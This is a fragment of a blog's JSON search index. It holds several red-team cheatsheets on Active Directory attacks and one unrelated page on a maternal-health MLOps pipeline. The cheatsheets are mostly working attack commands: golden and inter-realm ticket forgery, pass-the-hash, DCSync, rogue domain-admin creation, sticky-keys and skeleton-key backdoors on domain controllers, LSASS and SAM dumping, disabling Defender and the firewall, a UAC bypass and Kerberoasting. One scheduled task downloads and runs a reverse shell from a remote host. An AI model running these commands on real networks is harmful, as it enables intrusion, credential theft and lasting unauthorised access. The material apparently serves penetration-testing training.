CIFS/evilcorp-dc.evilcorp.local Use the TGS to access the targeted service.\n# kirbikator.exe .\\kirbikator.exe lsa .\\CIFS.evilcorp-dc.evilcorp.local.kirbi Now you can access the trusted forest shares:\nls \\\\evilcorp-dc.evilcorp.local\\forestshare Alternatively, it is possible to use Kekeo to ask for the TGS:\n.\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\kekeo_old\\trust_forest_tkt.kirbi /service:CIFS/evilcorp-dc.evilcorp.local /dc:evilcorp-dc.evilcorp.local /ptt Search for Foreign Security Prinicpals To search for Foreign Security Principals (users who have joined groups in the trusted domain but are part of the first domain) we can use the below PowerView command:\n# PowerView Find-ForeignUser -Domain \u0026#34;evilcorp.local\u0026#34; -Verbose Find-ForeignGroup -Domain \u0026#34;evilcorp.local\u0026#34; -Verbose We get an ObjectSID that we have to search in our current domain to see if it exists:\n# PowerView Get-NetUser | ?{$_.objectsid -eq \u0026#34;S-1-5-21-738119705-704267045-3387619857-1275\u0026#34;} The ObjectSID corresponds to STUDENT2. Let’s impersonate STUDENT2 who is a user of the domain cybercorp.local:\n# Invoke-Mimikats Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /user:STUDENT2 /domain:cybercorp.local /ntlm:6b164d3b190489426e9bcb4a01df5b53 /run:powershell.exe\u0026#34;\u0026#39; Then we can access the other forest:\nls \\\\evil-dc.evilcorp.local\\c$ Search for interesting ACLs Search for interesting ACLs in the evilcorp.local forest filtering the results belonging to users in our current domain:\nInvoke-ACLScanner -Domain evilcorp.local | ?{$_.IdentitySID -match \u0026#34;S-1-5-21-738119705-704267045-3387619857\u0026#34;} The user STUDENT1 in our cyberlab.cybercorp.local has GenericAll rights on STUDENT3 in evilcorp.local. This means, interesting stuff, like password reset can be done on STUDENT3 (using Powerview dev):\n# PowerView_dev Set-DomainUserPassword -Identity STUDENT3 -AccountPassword (ConvertTo-SecureString \u0026#34;Password@123\u0026#34; –AsPlainText -Force) -Domain evilcorp.local -Verbose ","date":16632e5,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":16632e5,"objectID":"5b721aad0dc7c548a59ea23ea11d39cb","permalink":"https://www.peco602.com/post/0060-across-forests-cheatsheet/","publishdate":"2022-09-15T00:00:00Z","relpermalink":"/post/0060-across-forests-cheatsheet/","section":"post","summary":"Active Directory forests are the highest level of security boundary for network objects in the Active Directory tree and forest structure. Within this Active Directory hierarchy, a forest is considered the most important logical container in an Active Directory configuration.","tags":["Red Teaming","Windows","Active Directory","Forests"],"title":"Across Forests cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Domains in same forest have an implicit two-way trust with other domains. There is a trust key between the parent and child domains. There are two ways of escalating privileges between two domains of same forest:\nKrbtgt hash Trust Tickets Child to Parent using Trust Tickets Look for [In] trust key from child to parent: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::trust /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::dcsync /user:cyberlab\\cybercorp$\u0026#34;\u0026#39; An inter-realm TGT can be forged: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;Kerberos::golden /user:[USER] /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /rc4:[TRUST_KEY_NTLM] /service:krbtgt /target:[PARENT_DOMAIN_FQDN] /ticket:[TICKET_EXPORT_PATH]\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;Kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /rc4:7ef5be456dc8d7450fb8f5f7348746c5 /service:krbtgt /target:cybercorp.local /ticket:C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi\u0026#34;\u0026#39; Parameter Optional Description /user No Username to impersonate /domain No Domain FQDN /sid No SID of the current domain /sids No SID of the enterprise admins group of the parent domain /rc4 No NTLM (RC4) hash of the trust key account. Use /aes128 and /aes256 for using AES keys /target No Target server FQDN /service No Target service in the parent domain (krbtgt) /id Yes User RID (default 500) /groups Yes Group RID (default 513 512 520 518 519) /startoffset Yes When the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future /endin Yes Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes /renewmax Yes Ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 /ptt Injects the ticket into the current PowerShell process (no need to save the ticket on disk) /ticket Saves the ticket to a file for later use Get a TGS for a service (e.g. CIFS) in the target domain by using the forged trust ticket. Tickets for other services (like HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting and WinRM) can be created as well: # asktgs.exe .\\asktgs.exe C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi CIFS/cybercorp-dc.cybercorp.local Use the TGS to access the targeted service (may need to use it twice). # kirbikator.exe .\\kirbikator.exe lsa .\\CIFS.cybercorp-dc.cybercorp.local.kirbi Access the file share on the parent domain DC: ls \\\\cybercorp-dc.cybercorp.local\\c$ Alternatively, it is possible to use Kekeo to ask for the TGS:\n.\\Rubeus.exe asktgs /ticket:C:\\AD\\Tools\\kekeo_old\\trust_tkt.kirbi /service:CIFS/cybercorp-dc.cybercorp.local /dc:cybercorp-dc.cybercorp.local /ptt Child to Parent using krbtgt hash Look for krbtgt hash: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; Generate a Golden Ticket forcing the SID History parameter. We will abuse SID history once again. The mimkatz option “/sids” is forcefully setting the SID History for the Enterprise Admin group for cyberlab.cybercorp.local that is the Forest Enterprise Admin Group: # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:Administrator /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /sids:[ENTERPRISE_ADMINS_GROUP_SID] /krbtgt:[KRBTGT_NTLM_HASH] /ticket:[TICKET_EXPORT_PATH]\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:Administrator /domain:cyberlab.cybercorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-15-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\\AD\\Tools\\krbtgt_tkt.kirbi\u0026#34;\u0026#39; Pass the ticket to the current session on any machine of the current domain: Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt C:\\AD\\Tools\\krbtgt_tkt.kirbi\u0026#34;\u0026#39; Now, it is possible to access to machine services in the forest root domain: ls \\\\cybercorp-dc.cybercorp.local\\c$ gwmi -class win32_operatingsystem -ComputerName cybercorp-dc.cybercorp.local In order to avoid suspicious logs, impersonate Domain Controller account add to the SID History the SIDs of parent Domain Controllers group and Enterprise Domain Controllers group and set the group to 516 (Enterprise Admins group).\nGroup SID Domain Controllers S-1-5-21-[DOMAIN_ID]-516 Enterprise Domain Controllers S-1-5-9 # Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:[DC_NAME]$ /domain:[CURRENT_DOMAIN_FQDN] /sid:[CURRENT_DOMAIN_SID] /groups:516 /sids:[PARENT_DOMAIN_CONTROLLERS_GROUP_SID],[ENTERPRISE_DOMAIN_CONTROLLERS_GROUP_SID] /krbtgt:[KRBTGT_HASH] /ptt\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:dc$ /domain:cyberlab.cybercorp.local /sid:S-1-5-211874506631-3219952063-538504511 /groups:516 /sids:S-1-521-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 …","date":1662595200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1662595200,"objectID":"3a8d18685d8770ee6a4f3342af573ce6","permalink":"https://www.peco602.com/post/0050-across-domain-trusts-cheatsheet/","publishdate":"2022-09-08T00:00:00Z","relpermalink":"/post/0050-across-domain-trusts-cheatsheet/","section":"post","summary":"Trusts are relationships between domains or forests which allows users of one domain or forest to access resources in the other domain or forest.","tags":["Red Teaming","Windows","Active Directory","Trusts"],"title":"Across Domain Trusts cheatsheet","type":"post"},{"authors":null,"categories":null,"content":"Introduction According to the World Health Organization (WHO):\n“Maternal health refers to the health of women during pregnancy, childbirth and the post-natal period. Each stage should be a positive experience, ensuring women and their babies reach their full potential for health and well-being. Although important progress has been made in the last two decades, about 295 000 women died during and following pregnancy and childbirth in 2017. This number is unacceptably high. The most common direct causes of maternal injury and death are excessive blood loss, infection, high blood pressure, unsafe abortion, and obstructed labour, as well as indirect causes such as anemia, malaria, and heart disease. Most maternal deaths are preventable with timely management by a skilled health professional working in a supportive environment. Ending preventable maternal death must remain at the top of the global agenda. At the same time, simply surviving pregnancy and childbirth can never be the marker of successful maternal health care. It is critical to expand efforts reducing maternal injury and disability to promote health and well-being. Every pregnancy and birth is unique. Addressing inequalities that affect health outcomes, especially sexual and reproductive health and rights and gender, is fundamental to ensuring all women have access to respectful and high-quality maternity care.”\nThe goal of the project is to apply what has been learned during the MLOps Zoomcamp course to build a MLOps pipeline for woman health risk prediction during pregnancy.\nDataset The dataset used to feed the MLOps pipeline has been downloaded from Kaggle and contains data collected from several hospitals, community clinics and maternal health cares through an IoT-based risk monitoring system. The dataset is updated daily and is characterized by the following features:\nFeature Description Age Age when a woman is pregnant. SystolicBP Upper value of blood pressure. DiastolicBP Lower value of blood pressure. BS Blood glucose levels in terms of molar concentration. HeartRate A normal resting heart rate. BodyTemp Average human body temperature. Risk Level Predicted risk intensity level during pregnancy considering the previous attributes. MLOps pipeline Architecture Deployment The MLOps pipeline is fully dockerised and can be easily deployed via the following steps:\nClone the maternal-health-risk repository locally:\n$ git clone https://github.com/Peco602/maternal-health-risk.git Install the pre-requisites necessary to run the pipeline:\n$ cd maternal-health-risk $ sudo apt install make $ make prerequisites It is also suggested to add the current user to the docker group to avoid running the next steps as sudo:\n$ sudo groupadd docker $ sudo usermod -aG docker $USER then, logout and log back in so that the group membership is re-evaluated.\n[Optional] Configure the development evironment:\n$ make setup This is required to perform further development and testing on the pipeline.\n[Optional] Insert Kaggle credentials in the .env file to allow the automatic scheduled dataset update:\n# Kaggle credentials KAGGLE_USERNAME=***** KAGGLE_KEY=***** In case the credentials are not available, the training dataset data/data.csv must be updated manually.\nPull the Docker images:\n$ make pull Launch the MLOps pipeline:\n$ make run Once ready, the following services will be available:\nService Port Interface Description Web Application 80 0.0.0.0 Prediction web service (see picture below) Prefect 4200 127.0.0.1 Training workflow orchestration MLFlow 5000 127.0.0.1 Experiment tracking and model registry MinIO 9001 127.0.0.1 S3-equivalent bucket management Evidently 8085 127.0.0.1 Data and target drift report generation (/dashboard route) Grafana 3000 127.0.0.1 Data and target drift real-time dashboards Training Once the MLOps pipeline has been started, the prediction web service can already work thanks to a default pre-trained model available in the Docker image. In order to enable pipeline training workflow it is necessary to create a scheduled Prefect deployment via:\n$ make deployment The training workflow will be then automatically executed every day. It will download the latest dataset (if the Kaggle credentials have been provided), search the best model in terms of accuracy among XGBoost, Support Vector Machine and Random Forest and finally will store it in the model registry. It is worth noting the training workflow can also be immediately executed without waiting the next schedule:\n$ make train Once the updated model is ready, it can be moved to production by restarting the pipeline:\n$ make restart the web service will automatically connect to the registry and get the most updated model. If the model is still not available, it will continue to use the default one.\nMonitoring It is possible to generate simulated traffic via:\n$ make generate-traffic Then, the prediction service can be monitored via:\nGrafana (in real-time): http://127.0.0.1:3000 Evidently (for report …","date":1662422400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1662422400,"objectID":"26f4fa3d5b336e469f9367ecfaed54ce","permalink":"https://www.peco602.com/project/0040-maternal-health-mlops/","publishdate":"2022-09-06T00:00:00Z","relpermalink":"/project/0040-maternal-health-mlops/","section":"project","summary":"Fully dockerized MLOps pipeline for maternal health risk prediction presented as final project MLOps Zoomcamp from DataTalks.Club.","tags":["MLOps","Medical","Python"],"title":"Maternal Health Risk Predictor","type":"project"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"The following techiniques require Domain Administrator privileges on the target domain.\nDCSync .\\mimikatz.exe mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt . .\\Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command “lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt” Adding domain admin user net user jeff.ridges FooBar123! /add /domain net group \u0026#34;Administrators\u0026#34; jeff.ridges /add /domain net group \u0026#34;Domain Admins\u0026#34; jeff.ridges /add /domain net group \u0026#34;Enterprise Admins\u0026#34; jeff.ridges /add /domain Enabling plaintext credentials caching on DCs reg add \u0026#34;\\\\cyberlab-dc.cyberlab.cybercorp.local\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\u0026#34; /v UseLogonCredential /t REG_DWORD /d 1 /f reg add \u0026#34;\\\\cyberlab-dc.cyberlab.cybercorp.local\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\u0026#34; /v DisableDomainCreds /t REG_DWORD /d 0 /f Installing a sticky keys backdoor on DCs reg add \u0026#34;\\\\cyberlab-dc.cyberlab.cybercorp.local\\HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; /f\u0026#34;); Scheduled Task Schedule and execute a task (needs a Silver Ticket for the HOST service)\nschtasks /create /S \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; /SC Minute /RU \u0026#34;NT Authority\\SYSTEM\u0026#34; /TN \u0026#34;TASK_NAME\u0026#34; /TR \u0026#34;powershell.exe -ep bypass -c \u0026#39;iex (New-Object Net.WebClient).DownloadString(\u0026#39;\u0026#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1\u0026#39;\u0026#39;\u0026#39;)\u0026#39;\u0026#34; schtasks /run /S \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; /TN \u0026#34;TASK_NAME\u0026#34; schtasks /delete /S \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; /TN \u0026#34;TASK_NAME\u0026#34; Skeleton Key Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice (DA privileges required)\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;misc::skeleton\u0026#34;\u0026#39; -ComputerName \u0026#34;COMPUTER1\u0026#34; :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # misc::skeleton Now, it is possible to access any machine with a valid username and password as mimikatz:\nEnter-PSSession -ComputerName \u0026#34;COMPUTER1\u0026#34; -Credential \u0026#34;cyberlab.cybercorp.local\\Administrator\u0026#34; In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:\n:: mimikatz.exe mimikatz # privilege::debug mimikatz # !+ mimikatz # !processprotect /process:lsass.exe /remove mimikatz # misc::skeleton mimikatz # ! DSRM There is a local administrator on every DC called Administrator whose password is the DSRM password. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.\nDump DSRM password (requires Domain Admin privileges):\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; Enable logon through hash for DSRM:\nNew-ItemProperty \u0026#34;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u0026#34; -Name \u0026#34;DsrmAdminLogonBehavior\u0026#34; -Value 2 -PropertyType DWORD Since it is the local administrator of the DC, we can pass-the-hash to authenticate. Use below command to pass the hash (/domain: parameter needs machine and not domain name)\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:[DC_FQDN] /user:Administrator /ntlm:[DSRM_NTLM_HASH] /run:powershell.exe\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:cyberlab-dc.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\u0026#34;\u0026#39; Now, it is possible to navigate through domain controller file system:\nls \\\\cyberlab-dc.cyberlab.cybercorp.local\\C$ Custom SSP Add mililib.dll library to log every account access. Drop the mimilib.dll to system32 and add mimilib to HKLMPackages:\npackages = Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name \u0026#39;Security Packages\u0026#39; | select -ExpandProperty \u0026#39;Security Packages\u0026#39; $packages += \u0026#34;mimilib\u0026#34; Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\ -Name \u0026#39;Security Packages\u0026#39; -Value $packages Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name \u0026#39;Security Packages\u0026#39; -Value $packages Using mimikatz, inject into lsass (Not stable with Server 2016):\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;misc::memssp\u0026#34;\u0026#39; Once the SSP is registered, all users who log on to the DC, and all local services will log their passwords to the c:\\Windows\\System32\\mimilsa.log file.\nACL Right Abuse With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.\nCheck if the user has replication rights on the domain:\n# PowerView Get-ObjectAcl -DistinguishedName \u0026#34;dc=cyberlab,dc=cybercorp,dc=local\u0026#34; -ResolveGUIDs | ?{($_.IdentityReference -match \u0026#34;STUDENT1\u0026#34;) -and (($_.ObjectType -match \u0026#39;replication\u0026#39;) -or ($_.ActiveDirectoryRights -match \u0026#39;GenericAll\u0026#39;))} Add FullControl rights to the domain object:\n# PowerView Add-ObjectAcl -TargetDistinguishedName \u0026#34;DC=cyberlab,DC=cybercorp,DC=local\u0026#34; -PrincipalSamAccountName \u0026#34;STUDENT1\u0026#34; -Rights All -Verbose # …","date":1661990400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1661990400,"objectID":"e7fa60aa0f16a9bb0c62ecf1be0a0412","permalink":"https://www.peco602.com/post/0040-domain-persistence-cheatsheet/","publishdate":"2022-09-01T00:00:00Z","relpermalink":"/post/0040-domain-persistence-cheatsheet/","section":"post","summary":"Domain persistence consists of techniques that adversaries use to maintain access the Active Directory environment across restarts, changed credentials, and other interruptions that could cut off their access.","tags":["Red Teaming","Windows","Active Directory","Persistence"],"title":"Domain Persistence cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Basic commands Dump credentials on a local machine (needs local administrator rights):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -DumpCreds Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34;\u0026#39;\t# Cached passwords Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39;\t# SAM database passwords Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::secrets\u0026#34;\u0026#39;\t# LSA secrets Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::cache\u0026#34;\u0026#39;\t# Cached credentials :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::logonpasswords mimikatz # lsadump::sam mimikatz # lsadump::secrets mimikatz # lsadump::cache mimikatz # vault::list mimikatz # vault::cred mimikatz # vault::cred /patch Dump credentials on multiple remote machines (needs administrator rights on remote machines):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -DumpCreds -ComputerName @(\u0026#34;COMPUTER1\u0026#34;, \u0026#34;COMPUTER2\u0026#34;) ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061: The required privilege is not held by the client (mostly you’re not an administrator).\nERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005): No rights to access the LSASS process.\nExtract in-memory credentials from a minidump of a local machine (needs local administrator rights):\n:: procdump.exe :: On the remote machine (needs local admin rights) .\\procdump.exe -accepteula -ma lsass.exe c:\\users\\public\\dump.dmp 2\u0026gt;\u0026amp;1 :: mimikatz.exe :: On the local machine after the reception of the minidump file dump.dmp mimikatz # sekurlsa::minidump dump.dmp mimikatz # sekurlsa::logonpasswords Extract SAM credentials from a local machine without Mimikatz (needs local administrator rights):\n:: procdump.exe :: On the remote machine (needs local admin rights) reg save hklm\\system SYSTEM.sav reg save hklm\\sam SAM.sav reg save hklm\\security SECURITY.sav Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::sam /sam:SAM.sav /system:SYSTEM.sav\u0026#34;\u0026#39; or:\n# Impacket # On a local kali machine impacket-secretsdump -sam ./SAM -system ./SYSTEM -security ./SECURITY LOCAL Extract tickets relative to all users on a machine:\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::tickets /export\u0026#34;\u0026#39; Inject the ticket of interest in the current user session:\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::ptt [0;82f8f7]-2-0-60a10000-dbprodadmin@krbtgt-US.FUNCORP.LOCAL.kirbi\u0026#34;\u0026#39; } Execute mimikatz to get krbtgt hash (must be specified DC as ComputerName and requires Domain Admin privileges):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;lsadump::lsa /patch\u0026#34;\u0026#39; -ComputerName \u0026#34;cyberlab-dc.cyberlab.cybercorp.local\u0026#34; :: mimikatz.exe :: To be executed on domain controller mimikatz # lsadump::lsa /patch Pass-the-Hash “Pass-the-Hash” inject a hash for a machine local administrator (needs local administrator rights). Once you get the NTLM hash of the RID 500 remote machine Administrator it is possible to inject it into a session:\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe\u0026#34;\u0026#39; Invoke-Mimikatz -Command \u0026#39;\u0026#34;sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\u0026#34;\u0026#39; :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::pth /domain:[COMPUTER_FQDN] /user:Administrator /ntlm:[NTLM_HASH] /run:powershell.exe mimikatz # sekurlsa::pth /domain:COMPUTER1.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe and the open a SYSTEM shell by psexec:\npsexec.exe \\\\COMPUTER1 cmd Over-Pass-the-Hash “Over-Pass-the-Hash” generate tokens from hashes (needs local administrator rights):\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe\u0026#34;\u0026#39; :: mimikatz.exe mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::pth /user:Administrator /domain:cyberlab.cybercorp.local /ntlm:[NTLM_HASH] /run:powershell.exe Golden Ticket Generate a TGT encripted with krbtgt hash valid for every user:\n# Invoke-Mimikatz.ps1 Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt\u0026#34;\u0026#39; :: mimikatz.exe mimikatz # kerberos::golden /user:[USER] /domain:[DOMAIN_FQDN] /sid:[DOMAIN_SID] /krbtgt:[KRBTGT_NTLM_HASH] /id:[USER_RID] /groups:[GROUP_RID] /startoffset:[MINUTES_START_AVAILABILITY] /endin:[MINUTES_STOP_AVAILABILITY] /renewmax:[MINUTES_LIFETIME_WITH_RENEWAL] /ptt Golden Ticket Parameters\nParameter Optional Description /user No Username for which the TGT is generated /domain No Domain FQDN /sid No SID of the domain /krbtgt No NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys /sids Yes Additional …","date":1659830400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1659830400,"objectID":"643a7f6a60b62ee737414f98d62667fc","permalink":"https://www.peco602.com/post/0030-mimikatz-cheatsheet/","publishdate":"2022-08-07T00:00:00Z","relpermalink":"/post/0030-mimikatz-cheatsheet/","section":"post","summary":"Mimikatz is an open-source application that allows users to view and save authentication credentials such as Kerberos tickets. The toolset works with the current release of Windows and includes a collection of different network attacks to help assess vulnerabilities.","tags":["Red Teaming","Windows","Active Directory","Mimikatz"],"title":"Mimikatz cheatsheet","type":"post"},{"authors":["Giovanni Pecoraro"],"categories":["Cyber Security","Red Teaming"],"content":"Windows Defender # Disable Windows Defender Set-MpPreference -DisableRealtimeMonitoring $true Set-MpPreference -DisableIOAVProtection $true # Disable Firewall ## cmd.exe netsh advfirewall set allprofiles state off ## powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False User Account Control (UAC) In case you are a member of the local administrators group, but you still have the Medium Mandatory Level label, it is necessary to bypass the User Account Control (UAC):\n# FodhelperUACBypass.ps1 . .\\FodhelperUACBypass.ps1 FodhelperUACBypass -program \u0026#34;cmd.exe\u0026#34; FodhelperUACBypass -program \u0026#34;cmd.exe /c powershell.exe\u0026#34; FodhelperUACBypass -program \u0026#34;cmd.exe /c net localgroup administrators CYBERLAB\\STUDENT01 /add\u0026#34; Alternatively, you can use SharpBypassUAC.\nToken Manipulation Tokens can be impersonated from other users with a session/running processes on the machine. A similar effect can be achieved by using e.g. CobaltStrike to inject into said processes.\nIncognito # A SYSTEM shell is required .\\PsExec64.exe -s -i -d powershell.exe # Show tokens on the machine .\\incognito.exe list_tokens -u # Start new process with token of a specific user .\\incognito.exe execute \u0026#34;CYBERLAB\\STUDENT2\u0026#34; C:\\Windows\\system32\\calc.exe .\\incognito.exe execute -c \u0026#34;CYBERLAB\\STUDENT2\u0026#34; powershell.exe Invoke-TokenManipulation # Show all tokens on the machine Invoke-TokenManipulation -ShowAll # Show only unique, usable tokens on the machine Invoke-TokenManipulation -Enumerate # Start new process with token of a specific user Invoke-TokenManipulation -ImpersonateUser -Username \u0026#34;CYBERLAB\\STUDENT2\u0026#34; # Start new process with token of another process Invoke-TokenManipulation -CreateProcess \u0026#34;C:\\Windows\\system32\\calc.exe\u0026#34; -ProcessId 500 Classic Kerberoasting Find user accounts used as Service accounts:\n# PowerView Get-NetUser -SPN # ActiveDirectory Module Get-ADUser -Filter {ServicePrincipalName -ne \u0026#34;$null\u0026#34;} -Properties ServicePrincipalName Request a Ticket Granting Service (TGS):\n# PowerShell Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \u0026#34;MSSQLSvc/database.cyberlab.cybercorp.local\u0026#34; # PowerView Request-SPNTicket -SPN \u0026#34;MSSQLSvc/database.cyberlab.cybercorp.local\u0026#34; Check if the TGS has been granted:\nklist Export all tickets using Mimikatz\n# Invoke-Mimikatz Invoke-Mimikatz -Command \u0026#39;\u0026#34;kerberos::list /export\u0026#34;\u0026#39; Crack the Service account password (this step can be performed on a Kali machine):\n# tgsrepcrack.py git clone https://github.com/nidem/kerberoast python3 ./tgsrepcrack.py ./10-million-password-list-top-1000000.txt ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi the same TGS can also be cracked by using john, but it must be firstly converted into a compatible format:\n# tgsrepcrack.py python3 ./kirbi2john.py -o ./tgs.john ./240a10000-STUDENT1@MSSQLSvc~database.cyberlab.cybercorp.localCYBERLAB.LOCAL.kirbi # JohnTheRipper /usr/sbin/john --format=krb5tgs ./tgs.john --wordlist=./10-million-password-list-top-1000000.txt An alternative way to perform Kerberoasting is to use PowerSploit combined to john or hashcat:\nFind user accounts used as Service accounts:\n# PowerView Get-NetUser -SPN # ActiveDirectory Module Get-ADUser -Filter {ServicePrincipalName -ne \u0026#34;$null\u0026#34;} -Properties ServicePrincipalName Request a TGS:\n# Invoke-Kerberoast.ps1 ## JohnTheRipper (bleeding-jumbo branch) Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII john_tgs.kirbi ## HashCat Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashcat_tgs.kirbi Brute-force the exported ticket:\n# JohnTheRipper (bleeding-jumbo branch) john --format=krb5tgs --wordlist=./10-million-password-list-top-1000000.txt john_tgs.kirbi # HashCat hashcat -m 13100 --force hashcat_tgs.kirbi ./10-million-password-list-top-1000000.txt The hashcat format can also be cracked by john.\nTargeted Kerberoasting 